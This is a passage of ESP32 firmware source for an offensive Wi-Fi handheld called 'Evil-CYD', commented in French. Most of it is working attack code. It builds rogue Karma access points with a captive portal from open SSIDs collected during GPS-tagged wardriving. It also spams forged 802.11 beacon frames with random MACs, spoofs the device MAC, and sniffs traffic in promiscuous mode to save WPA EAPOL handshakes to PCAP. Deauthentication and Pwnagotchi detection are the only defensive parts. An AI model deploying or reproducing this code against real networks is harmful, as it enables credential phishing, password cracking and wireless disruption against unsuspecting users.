    isInitialDisplayDone = true;
  }

  // Mise à jour de la valeur du temps restant
  int timeValuePosX = tft.textWidth("Left Time: ");
  int timeValuePosY = 30;
  tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
  tft.setCursor(timeValuePosX, timeValuePosY);
  tft.print(remainingTime);
  tft.print(" s  ");

  // Mise à jour du nombre de clients connectés
  int clientValuePosX = tft.textWidth("Connected Client: ");
  int clientValuePosY = 50;
  tft.fillRect(clientValuePosX, 40 , 25 , 20, menuBackgroundColor);
  tft.setTextColor(menuTextUnFocusedColor);
  tft.setCursor(clientValuePosX, clientValuePosY);
  tft.print(clientCount);

  // Détection tactile pour la zone "Stop" au bas de l'écran
  TouchPoint touch = ts.getTouch();
  if (touch.zRaw != 0) {
    int x = map(touch.xRaw, minX, maxX, 0, tft.width());
    int y = map(touch.yRaw, minY, maxY, 0, tft.height());

    // Zone centrale pour confirmer l'arrêt (partie inférieure)
    if (y > tft.height() - 30 && x > tft.width() / 3 && x < 2 * (tft.width() / 3)) {
      Serial.println("Stopping AP mode as requested by user.");
      WiFi.softAPdisconnect(true);  // Arrêter l'AP
      waitAndReturnToMenu("AP Mode Stopped");
      isInitialDisplayDone = false;
    }
  }
}


//Auto karma end


String createPreHeader() {
  String preHeader = "WigleWifi-1.4";
  preHeader += ",appRelease=Beta"; // Remplacez [version] par la version de votre application
  preHeader += ",model=EVIL-CYD";
  preHeader += ",release=Beta"; // Remplacez [release] par la version de l'OS de l'appareil
  preHeader += ",device=Evil-CYD"; // Remplacez [device name] par un nom de périphérique, si souhaité
  preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
  preHeader += ",board=EVIL-CYD";
  preHeader += ",brand=EVIL-CYD";
  return preHeader;
}

String createHeader() {
  return "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type";
}

int nearPrevousWifi = 0;
double lat = 0.0, lng = 0.0, alt = 0.0; // Déclaration des variables pour la latitude, la longitude et l'altitude
float accuracy = 0.0; // Déclaration de la variable pour la précision


void wardrivingMode() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  Serial.println("-------------------");
  Serial.println("Starting Wardriving");
  Serial.println("-------------------");

  // Variables GPS à portée plus large
  double lat = 0.0, prevLat = 0.0;
  double lng = 0.0, prevLng = 0.0;
  double alt = 0.0, prevAlt = 0.0;
  unsigned int sat = 0, prevSat = 0;
  unsigned int hdop = 0, prevHdop = 0;
  double speed = 0.0, prevSpeed = 0.0;
  double course = 0.0, prevCourse = 0.0;
  unsigned int month = 0, day = 0, year = 0;
  String gpsTime = "", prevGpsTime = "";

  // Configuration de l'écran
  tft.fillScreen(menuBackgroundColor);
  tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  tft.setTextSize(2);
  tft.fillRect(0, tft.height() - 30, tft.width(), 30, TFT_RED);
  tft.setCursor(tft.width() / 2 - 24, tft.height() - 20);
  tft.setTextColor(TFT_WHITE);
  tft.println("Stop");

  tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
  tft.setCursor(0, 10);
  tft.printf("Scanning...");
  tft.setCursor(0, 30);
  tft.println("No GPS Data");

  delay(1000);
  if (!SD.exists("/wardriving")) {
    SD.mkdir("/wardriving");
  }

  File root = SD.open("/wardriving");
  int maxIndex = 0;
  while (true) {
    File entry = root.openNextFile();
    if (!entry) break;
    String name = entry.name();
    int startIndex = name.indexOf('-') + 1;
    int endIndex = name.indexOf('.');
    if (startIndex > 0 && endIndex > startIndex) {
      int fileIndex = name.substring(startIndex, endIndex).toInt();
      if (fileIndex > maxIndex) maxIndex = fileIndex;
    }
    entry.close();
  }
  root.close();

  bool exitWardriving = false;
  bool scanStarted = false;
  while (!exitWardriving) {
    handleDnsRequestSerial();

    if (!scanStarted) {
      WiFi.scanNetworks(true, true); // Lancer un scan asynchrone
      scanStarted = true;
    }

    bool gpsDataAvailable = false;

    while (cardgps.available() > 0 && !gpsDataAvailable) {
      if (gps.encode(cardgps.read())) {
        if (gps.location.isValid() && gps.date.isValid() && gps.time.isValid()) {
          // Récupération des données GPS
          lat = gps.location.lat();
          lng = gps.location.lng();
          alt = gps.altitude.meters();
          sat = gps.satellites.value();
          hdop = gps.hdop.value();
          speed = gps.speed.isValid() ? gps.speed.kmph() : 0.0;
          course = gps.course.isValid() ? gps.course.deg() : 0.0;
          month = gps.date.month();
          day = gps.date.day();
          year = gps.date.year();
          gpsTime = formatTimeFromGPS();

          gpsDataAvailable = true;

          // Affichage avec une distance de 25 pixels entre chaque ligne
          int y = 30;
          int lineHeight = 25;

          if (lat != prevLat) {
            tft.fillRect(0, y, tft.width(), lineHeight, TFT_BLACK);
            tft.setCursor(0, y);
            tft.print("Lat:");
            tft.println(String(lat, 6));
            prevLat = lat;
          }
          y += lineHeight;

          if (lng != prevLng) {
            tft.fillRect(0, y, tft.width(), lineHeight, TFT_BLACK);
            tft.setCursor(0, y);
            tft.print("Lng:");
            tft.println(String(lng, 6));
            prevLng = lng;
          }
          y += lineHeight;

          if (alt != prevAlt || sat != prevSat) {
            tft.fillRect(0, y, tft.width(), lineHeight, TFT_BLACK);
            tft.setCursor(0, y);
            tft.print("Alt:");
            tft.print(String(alt, 2));
            tft.print("m Sat:");
            tft.println(String(sat));
            prevAlt = alt;
            prevSat = sat;
          }
          y += lineHeight;

          if (speed != prevSpeed || course != prevCourse) {
            tft.fillRect(0, y, tft.width(), lineHeight, TFT_BLACK);
            tft.setCursor(0, y);
            tft.print("Spd:");
            tft.print(String(speed, 2));
            tft.print("km/h Crs:");
            tft.println(String(course, 2));
            prevSpeed = speed;
            prevCourse = course;
          }
          y += lineHeight;

          if (hdop != prevHdop) {
            tft.fillRect(0, y, tft.width(), lineHeight, TFT_BLACK);
            tft.setCursor(0, y);
            tft.print("HDOP:");
            tft.print(String(hdop));
            prevHdop = hdop;
          }
          y += lineHeight;

          // Affichage de la date une seule fois
          if (month != 0 && day != 0 && year != 0) {
            tft.setCursor(0, y);
            tft.print("Date:");
            tft.print(month);
            tft.print("/");
            tft.print(day);
            tft.print("/");
            tft.println(year);
          }
          y += lineHeight;

          if (gpsTime != prevGpsTime) {
            tft.fillRect(0, y, tft.width(), lineHeight, TFT_BLACK);
            tft.setCursor(0, y);
            tft.print("Time:");
            tft.println(gpsTime);
            prevGpsTime = gpsTime;
          }
        }
      }
    }

    int n = WiFi.scanComplete();
    if (n > -1) {
      String currentTime = formatTimeFromGPS();
      String wifiData = "\n";
      for (int i = 0; i < n; ++i) {
        String line = WiFi.BSSIDstr(i) + "," + WiFi.SSID(i) + "," + getCapabilities(WiFi.encryptionType(i)) + ",";
        line += currentTime + ",";
        line += String(WiFi.channel(i)) + ",";
        line += String(WiFi.RSSI(i)) + ",";
        line += String(lat, 6) + "," + String(lng, 6) + ",";
        line += String(alt) + "," + String(hdop) + ",";
        line += "WIFI";
        wifiData += line + "\n";
      }

      Serial.println("----------------------------------------------------");
      Serial.print("WiFi Networks: " + String(n));
      Serial.print(wifiData);
      Serial.println("----------------------------------------------------");

      String fileName = "/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv";
      File file = SD.open(fileName, FILE_READ);
      bool isNewFile = !file || file.size() == 0;
      if (file) file.close();
      file = SD.open(fileName, isNewFile ? FILE_WRITE : FILE_APPEND);

      if (file) {
        if (isNewFile) {
          file.println(createPreHeader());
          file.println(createHeader());
        }
        file.print(wifiData);
        file.close();
      }

      scanStarted = false;
      tft.setCursor(0, 10);
      tft.printf("Near WiFi: %d  \n", n);
    }

    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());
      if (y > tft.height() - 30) {
        exitWardriving = true;
        delay(1000);
        tft.setTextSize(2);
        if (confirmPopup("List Open Networks?")) {
          tft.fillScreen(menuBackgroundColor);
          tft.setCursor(0, tft.height() / 2);
          tft.println("Saving Open Networks");
          tft.println("  Please wait...");
          createKarmaList(maxIndex);
        }
        waitAndReturnToMenu("Stopping Wardriving.");
        Serial.println("-------------------");
        Serial.println("Stopping Wardriving");
        Serial.println("-------------------");
      }
    }
    delay(100);
  }

  Serial.println("-------------------");
  Serial.println("Session Saved.");
  Serial.println("-------------------");
}






String getCapabilities(wifi_auth_mode_t encryptionType) {
  switch (encryptionType) {
    case WIFI_AUTH_OPEN: return "[OPEN][ESS]";
    case WIFI_AUTH_WEP: return "[WEP][ESS]";
    case WIFI_AUTH_WPA_PSK: return "[WPA-PSK][ESS]";
    case WIFI_AUTH_WPA2_PSK: return "[WPA2-PSK][ESS]";
    case WIFI_AUTH_WPA_WPA2_PSK: return "[WPA-WPA2-PSK][ESS]";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "[WPA2-ENTERPRISE][ESS]";
    default: return "[UNKNOWN]";
  }
}

String formatTimeFromGPS() {
  if (gps.time.isValid() && gps.date.isValid()) {
    char dateTime[30];
    sprintf(dateTime, "%04d-%02d-%02d %02d:%02d:%02d", gps.date.year(), gps.date.month(), gps.date.day(),
            gps.time.hour(), gps.time.minute(), gps.time.second());
    return String(dateTime);
  } else {
    return "0000-00-00 00:00:00";
  }
}

void createKarmaList(int maxIndex) {

  std::set<std::string> uniqueSSIDs;
  // Lire le contenu existant de KarmaList.txt et l'ajouter au set
  File karmaListRead = SD.open("/KarmaList.txt", FILE_READ);
  if (karmaListRead) {
    while (karmaListRead.available()) {
      String ssid = karmaListRead.readStringUntil('\n');
      ssid.trim();
      if (ssid.length() > 0) {
        uniqueSSIDs.insert(ssid.c_str());
      }
    }
    karmaListRead.close();
  }

  File file = SD.open("/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv", FILE_READ);
  if (!file) {
    Serial.println("Error opening scan file");
    return;
  } else {
    Serial.println("Scan file opened successfully");
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (isNetworkOpen(line)) {
      String ssid = extractSSID(line);
      uniqueSSIDs.insert(ssid.c_str());
    }
  }
  file.close();

  // Écrire le set dans KarmaList.txt
  File karmaListWrite = SD.open("/KarmaList.txt", FILE_WRITE);
  if (!karmaListWrite) {
    Serial.println("Error opening KarmaList.txt for writing");
    return;
  } else {
    Serial.println("KarmaList.txt opened for writing");
  }

  Serial.println("Writing to KarmaList.txt");
  for (const auto& ssid : uniqueSSIDs) {
    karmaListWrite.println(ssid.c_str());
    Serial.println("Writing SSID: " + String(ssid.c_str()));
  }
}

bool isNetworkOpen(const String & line) {
  int securityTypeStart = nthIndexOf(line, ',', 1) + 1;
  int securityTypeEnd = nthIndexOf(line, ',', 2);
  String securityType = line.substring(securityTypeStart, securityTypeEnd);
  return securityType.indexOf("[OPEN][ESS]") != -1;
}

String extractSSID(const String & line) {
  int ssidStart = nthIndexOf(line, ',', 0) + 1;
  int ssidEnd = nthIndexOf(line, ',', 1);
  String ssid = line.substring(ssidStart, ssidEnd);
  return ssid;
}

int nthIndexOf(const String & str, char toFind, int nth) {
  int found = 0;
  int index = -1;
  while (found <= nth && index < (int) str.length()) {
    index = str.indexOf(toFind, index + 1);
    if (index == -1) break;
    found++;
  }
  return index;
}


void karmaSpear() {
  isAutoKarmaActive = true;
  createCaptivePortal();
  File karmaListFile = SD.open("/KarmaList.txt", FILE_READ);
  if (!karmaListFile) {
    Serial.println("Error opening KarmaList.txt");
    waitAndReturnToMenu(" No KarmaFile.");
    return;
  }
  if (karmaListFile.available() == 0) {
    karmaListFile.close();
    Serial.println("KarmaFile empty.");
    waitAndReturnToMenu(" KarmaFile empty.");
    return;
  }

  bool stopRequested = false; // Drapeau pour arrêter la boucle
  
  while (karmaListFile.available() && !stopRequested) {
    
    String ssid = karmaListFile.readStringUntil('\n');
    ssid.trim();

    if (ssid.length() > 0) {
      activateAPForAutoKarma(ssid.c_str());
      Serial.println("Created Karma AP for SSID: " + ssid);
      displayAPStatus(ssid.c_str(), millis(), autoKarmaAPDuration);

      // Vérification de succès
      if (karmaSuccess) {
        waitAndReturnToMenu("return to menu");
        return;
      }
    }
  }

  karmaListFile.close();
  isAutoKarmaActive = false;

  if (stopRequested) {
    Serial.println("Karma Spear stopped by user.");
    waitAndReturnToMenu("Karma Spear stopped.");
  } else {
    Serial.println("Karma Spear Failed...");
    waitAndReturnToMenu("Karma Spear Failed...");
  }
}




int currentChannel = 1;
int originalChannel = 1;

void setNextWiFiChannel() {
  currentChannel++;
  if (currentChannel > 14) {
    currentChannel = 1;
  }
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

void restoreOriginalWiFiSettings() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); // Petite pause pour s'assurer que tout est terminé
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  restoreOriginalMAC();
  WiFi.mode(WIFI_STA);
}


// probe attack end


// beacon attack
std::vector<String> readCustomBeacons(const char* filename) {
  std::vector<String> customBeacons;
  File file = SD.open(filename, FILE_READ);

  if (!file) {
    Serial.println("Failed to open file for reading");
    return customBeacons;
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    line.trim();  // Enlever les espaces inutiles en fin de ligne

    if (line.startsWith("CustomBeacons=")) {
      String beaconsStr = line.substring(String("CustomBeacons=").length());

      while (beaconsStr.length() > 0) {
        int idx = beaconsStr.indexOf(',');
        if (idx == -1) {
          customBeacons.push_back(beaconsStr);
          break;
        } else {
          customBeacons.push_back(beaconsStr.substring(0, idx));
          beaconsStr = beaconsStr.substring(idx + 1);
        }
      }
      break;
    }
  }
  file.close();
  return customBeacons;
}

char randomName[32];
char *randomSSID() {
  const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  int len = random(8, 33);  // Génère une longueur entre 8 et 32
  for (int i = 0; i < len; ++i) {
    randomName[i] = charset[random() % strlen(charset)];
  }
  randomName[len] = '\0';  // Terminer par un caractère nul
  return randomName;
}

char emptySSID[32];
uint8_t beaconPacket[109] = {
  0x80, 0x00, 0x00, 0x00,             // Type/Subtype: management beacon frame
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC address (modifié plus tard)
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (modifié plus tard)
  0x00, 0x00,                                     // Fragment & sequence number (will be done by the SDK)
  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
  0xe8, 0x03,                                     // Interval: every 1s
  0x31, 0x00,                                     // Capabilities Information
  0x00, 0x20, // Tag: Set SSID length, Tag length: 32
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
  0x01, 0x08, // Tag: Supported Rates, Tag length: 8
  0x82,       // 1(B)
  0x84,       // 2(B)
  0x8b,       // 5.5(B)
  0x96,       // 11(B)
  0x24,       // 18
  0x30,       // 24
  0x48,       // 36
  0x6c,       // 54
  0x03, 0x01, // Channel set, length
  0x01,       // Current Channel
  0x30, 0x18,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x04, // WPA2 with CCMP
  0x02, 0x00,
  0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x00, 0x00
};

const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11}; // Canaux Wi-Fi utilisés (1-11)
uint8_t channelIndex = 0;
uint8_t wifi_channel = 1;

void nextChannel() {
  if (sizeof(channels) / sizeof(channels[0]) > 1) {
    wifi_channel = channels[channelIndex];
    channelIndex = (channelIndex + 1) % (sizeof(channels) / sizeof(channels[0]));
    esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
  }
}

void generateRandomWiFiMac(uint8_t *mac) {
  mac[0] = 0x02; // Unicast, locally administered MAC address
  for (int i = 1; i < 6; i++) {  // Génère aléatoirement les 5 autres octets
    mac[i] = random(0, 255);
  }
}

void beaconSpamList(const char *list, size_t listSize) {
  int i = 0;
  uint8_t macAddr[6];

  Serial.println("Starting beaconSpamList...");

  if (listSize == 0) {
    Serial.println("Empty list provided. Exiting beaconSpamList.");
    return;
  }

  nextChannel(); // Passer au canal suivant avant de commencer l'envoi

  while (i < listSize) {
    int j = 0;
    // Parcourt le SSID jusqu'à trouver la fin de la ligne ou atteindre la longueur maximale
    while (list[i + j] != '\n' && j < 32 && i + j < listSize) {
      j++;
    }

    uint8_t ssidLen = j;

    // Vérifie que la longueur du SSID ne dépasse pas 32 caractères
    if (ssidLen > 32) {
      Serial.println("SSID length exceeds limit. Skipping.");
      i += j;
      continue;
    }

    Serial.print("SSID: ");
    Serial.write(&list[i], ssidLen);
    Serial.println();

    // Génère une adresse MAC aléatoire pour chaque envoi
    generateRandomWiFiMac(macAddr);
    memcpy(&beaconPacket[10], macAddr, 6); // Source MAC address
    memcpy(&beaconPacket[16], macAddr, 6); // BSSID

    // Met à jour le champ SSID dans le paquet de balise
    memset(&beaconPacket[38], 0, 32);
    memcpy(&beaconPacket[38], &list[i], ssidLen);

    beaconPacket[37] = ssidLen; // Longueur du SSID
    beaconPacket[82] = wifi_channel; // Canal Wi-Fi actuel

    // Envoie le paquet de balise trois fois pour assurer la diffusion
    for (int k = 0; k < 3; k++) {
      esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), false);
        for (int l = 0; l < 10; l++) {
            delay(0); // Yield the processor for a short duration
        }
    }

    // Avance à la prochaine entrée dans la liste
    i += j + 1;

    // Sort de la boucle si l'utilisateur appuie sur une touche (arrêt d'urgence)
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      Serial.println("Beacon Spam interrupted by user.");
      break;
    }
  }

  Serial.println("Finished beaconSpamList.");
}


void beaconAttack() {
  WiFi.mode(WIFI_MODE_STA);
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);

  bool useCustomBeacons = confirmPopup("Use custom beacons?");
  tft.fillScreen(TFT_BLACK);

  std::vector<String> customBeacons;
  if (useCustomBeacons) {
    customBeacons = readCustomBeacons("/config/config.txt");
  }

  int beaconCount = 0;
  unsigned long previousMillis = 0;
  int delayTimeBeacon = 0;
  const int debounceDelay = 0;
  unsigned long lastDebounceTime = 0;

  // Afficher la zone d'arrêt
  tft.fillRect(0, tft.height() - 30, tft.width(), 30, TFT_RED);
  tft.setCursor(tft.width() / 2 - 24, tft.height() - 20);
  tft.setTextColor(TFT_WHITE, TFT_RED);
  tft.println("Stop");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);

  // Texte d'état de l'attaque
  tft.setCursor(10, 18);
  tft.println("Beacon Spam running...");
  Serial.println("-------------------");
  Serial.println("Starting Beacon Spam");
  Serial.println("-------------------");

  while (true) {
    unsigned long currentMillis = millis();
    if (currentMillis - previousMillis >= delayTimeBeacon) {
      previousMillis = currentMillis;

      if (useCustomBeacons && !customBeacons.empty()) {
        for (const auto& ssid : customBeacons) {
          beaconSpamList(ssid.c_str(), ssid.length());
        }
      } else {
        char *randomSSIDName = randomSSID();
        beaconSpamList(randomSSIDName, strlen(randomSSIDName));
      }

      beaconCount++;
    }

    // Détection tactile pour arrêter l'attaque
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());
      if (y > tft.height() - 30 && x >= 0 && x <= tft.width()) {
        break;
      }
    }

    delay(10);
  }

  Serial.println("-------------------");
  Serial.println("Stopping Beacon Spam");
  Serial.println("-------------------");
  restoreOriginalWiFiSettings();
  waitAndReturnToMenu("Beacon Spam Stopped.");
}



// beacon attack end



// Set wifi and password ssid

void setWifiSSID() {
  tft.fillScreen(TFT_BLACK);  // Effacez l'écran avant de rafraîchir le texte
  String nameSSID = ""; // Initialisez la chaîne de données pour stocker le SSID entré
  screenDebounce();
  nameSSID = getUserInput();
  cloneSSIDForCaptivePortal(nameSSID);
  waitAndReturnToMenu("Set Wifi SSID :" + nameSSID);
}

void setWifiPassword() {
  String newPassword = ""; // Initialisez la chaîne pour stocker le mot de passe entré
  tft.fillScreen(TFT_BLACK);  // Effacez l'écran avant de rafraîchir le texte
  screenDebounce();
  newPassword = getUserInput();
  captivePortalPassword = newPassword;
  waitAndReturnToMenu("Set Wifi Password :" + newPassword);
}

void setMacAddress() {
  String macAddress = ""; // Initialize the string to store the entered MAC address
  tft.fillScreen(TFT_BLACK);  // Clear the screen before refreshing the text
  screenDebounce();
  macAddress = getUserInput();
  if (isValidMacAddress(macAddress)) { // Validate the MAC address format
    setDeviceMacAddress(macAddress); // Set the MAC address for AP mode
  } else {
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 10);
    tft.println("MAC Address Error:");
    tft.setCursor(0, 30);
    tft.println("Invalid format. Use:");
    tft.println("XX:XX:XX:XX:XX:XX");

    delay(2000); // Display the message for 2 seconds
    // Clear and ask for the MAC address again
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 10);
    tft.println("Enter MAC Address:");
    tft.setCursor(0, 30);
    tft.println(macAddress); // Display the entered MAC address
  }
  waitAndReturnToMenu("Set MAC Address :" + macAddress);
}

// Helper function to validate MAC address format
bool isValidMacAddress(String mac) {
  // Check the length and format of the MAC address
  if (mac.length() == 17) {
    for (int i = 0; i < mac.length(); i++) {
      if (i % 3 == 2) {
        if (mac.charAt(i) != ':') return false;
      } else {
        if (!isHexadecimalDigit(mac.charAt(i))) return false;
      }
    }
    return true;
  }
  return false;
}

void setDeviceMacAddress(String mac) {
  // Convert the MAC address string to a byte array
  uint8_t macBytes[6];
  for (int i = 0; i < 6; i++) {
    macBytes[i] = (uint8_t) strtol(mac.substring(3 * i, 3 * i + 2).c_str(), NULL, 16);
  }

  // Ensure the MAC address is not locally administered
  macBytes[0] &= 0xFE;

  // Initialize WiFi in AP mode only
  WiFi.mode(WIFI_MODE_AP);

  // Disconnect WiFi before setting MAC
  esp_wifi_disconnect();
  delay(100);

  // Set the MAC address for AP (Access Point) mode
  esp_err_t resultAP = esp_wifi_set_mac(WIFI_IF_AP, macBytes);

  // Check results for AP
  if (resultAP == ESP_OK) {
    Serial.println("MAC address for AP mode set successfully");
  } else {
    Serial.print("Failed to set MAC address for AP mode: ");
    Serial.println(esp_err_to_name(resultAP));
  }

  // Display results on the M5Stack screen
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 10);
  if (resultAP == ESP_OK) {
    tft.println("MAC Address set for AP:");
    tft.println(mac);
  } else {
    tft.println("Error setting MAC Address");
  }


  // Start WiFi after setting MAC
  esp_wifi_start();
}




// Set wifi and password ssid end



// sniff handshake/deauth/pwnagotchi

bool beacon = false;
std::set<String> registeredBeacons;
unsigned long lastTime = 0;  // Last time update
unsigned int packetCount = 0;  // Number of packets received


void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  packetCount++;
  unsigned long currentTime = millis();
  if (currentTime - lastTime >= 1000) {
    tft.setCursor(tft.width() - 92, 0);
    tft.printf("PPS:%d ", packetCount);

    lastTime = currentTime;
    packetCount = 0;
  }

  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
  const uint8_t *frame = pkt->payload;
  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);

  const uint8_t frameType = (frameControl & 0x0C) >> 2;
  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

  if (estUnPaquetEAPOL(pkt)) {
    Serial.println("EAPOL Detected !!!!");

    const uint8_t *receiverAddr = frame + 4;
    const uint8_t *senderAddr = frame + 10;

    Serial.print("Address MAC destination: ");
    printAddress(receiverAddr);
    Serial.print("Address MAC expedition: ");
    printAddress(senderAddr);

    enregistrerDansFichierPCAP(pkt, false);
    nombreDeEAPOL++;
    tft.setCursor(tft.width() - 65, 20);
    tft.printf("H:");
    tft.print(nombreDeHandshakes);
    tft.setCursor(tft.width() - 121, 40);
    tft.printf("EAPOL:");
    tft.print(nombreDeEAPOL);
  }

  if (frameType == 0x00 && frameSubType == 0x08) {
    const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon

    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);

    if (strcmp(macStr, "DE:AD:BE:EF:DE:AD") == 0) {
      Serial.println("-------------------");
      Serial.println("Pwnagotchi Detected !!!");
      Serial.print("CH: ");
      Serial.println(ctrl.channel);
      Serial.print("RSSI: ");
      Serial.println(ctrl.rssi);
      Serial.print("MAC: ");
      Serial.println(macStr);
      Serial.println("-------------------");

      String essid = "";
      int essidMaxLength = 700;
      for (int i = 0; i < essidMaxLength; i++) {
        if (frame[i + 38] == '\0') break;

        if (isAscii(frame[i + 38])) {
          essid.concat((char)frame[i + 38]);
        }
      }

      int jsonStart = essid.indexOf('{');
      if (jsonStart != -1) {
        String cleanJson = essid.substring(jsonStart);

        DynamicJsonDocument json(4096);
        DeserializationError error = deserializeJson(json, cleanJson);

        if (!error) {
          String name = json["name"].as<String>();
          String pwndnb = json["pwnd_tot"].as<String>();
          Serial.println("Name: " + name);
          Serial.println("pwnd: " + pwndnb);
          displayPwnagotchiDetails(name, pwndnb);
        } else {
          Serial.println("Could not parse Pwnagotchi json");
        }
      } else {
        Serial.println("JSON start not found in ESSID");
      }
    } else {
      pkt->rx_ctrl.sig_len -= 4;
      enregistrerDansFichierPCAP(pkt, true);
    }
  }

  if (frameType == 0x00 && frameSubType == 0x0C) {
    const uint8_t *receiverAddr = frame + 4;
    const uint8_t *senderAddr = frame + 10;
    Serial.println("-------------------");
    Serial.println("Deauth Packet detected !!! :");
    Serial.print("CH: ");
    Serial.println(ctrl.channel);
    Serial.print("RSSI: ");
    Serial.println(ctrl.rssi);
    Serial.print("Sender: "); printAddress(senderAddr);
    Serial.print("Receiver: "); printAddress(receiverAddr);
    Serial.println();

    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(0, tft.height() / 3 - 20);
    tft.printf("Deauth Detected!");
    tft.setCursor(0, tft.height() / 3);
    tft.printf("CH: %d RSSI: %d  ", ctrl.channel, ctrl.rssi);
    tft.setCursor(0, tft.height() / 3 + 20);
    tft.print("Send: "); printAddressLCD(senderAddr);
    tft.setCursor(0, tft.height() / 3 + 40);
    tft.print("Receive: ");
    printAddressLCD(receiverAddr);
    nombreDeDeauth++;
    tft.setCursor(tft.width() - 130, 60);
    tft.printf("DEAUTH:");
    tft.print(nombreDeDeauth);
  }

  esp_task_wdt_reset();
  vTaskDelay(pdMS_TO_TICKS(10));
}


void displayPwnagotchiDetails(const String & name, const String & pwndnb) {
  // Construire le texte à afficher
  String displayText = "Pwnagotchi: " + name;
  String pwndText = "pwnd: " + pwndnb;

  // Préparer l'affichage
  tft.setTextColor(TFT_WHITE, TFT_BLACK);

  // Définir la position et afficher le nom du Pwnagotchi
  tft.setCursor(0, tft.height() - 60);
  tft.println(displayText);

  // Afficher le nombre de réseaux pwned
  tft.setCursor(0, tft.height() - 40);
  tft.println(pwndText);
}


void printAddressLCD(const uint8_t* addr) {
  // Utiliser sprintf pour formater toute l'adresse MAC en une fois
  sprintf(macBuffer, "%02X:%02X:%02X:%02X:%02X:%02X",
          addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);

  // Afficher l'adresse MAC
  tft.print(macBuffer);
}

unsigned long lastBtnBPressTime = 0;
const long debounceDelay = 200;

void deauthDetect() {
  bool exitDetected = false;
  unsigned long lastKeyPressTime = 0;  // Temps de la dernière pression tactile
  const unsigned long debounceDelay = 300;  // Délai de debounce en millisecondes

  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);

  if (!SD.exists("/handshakes") && !SD.mkdir("/handshakes")) {
    Serial.println("Fail to create /handshakes folder");
    return;
  }
  screenDebounce();

  while (!exitDetected) {
    esp_task_wdt_reset();
    vTaskDelay(pdMS_TO_TICKS(10));

    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());
      unsigned long currentPressTime = millis();

      // Vérifier la position du toucher
      if (x < tft.width() / 3 && currentPressTime - lastKeyPressTime > debounceDelay) {
        // Zone de gauche - Canal précédent
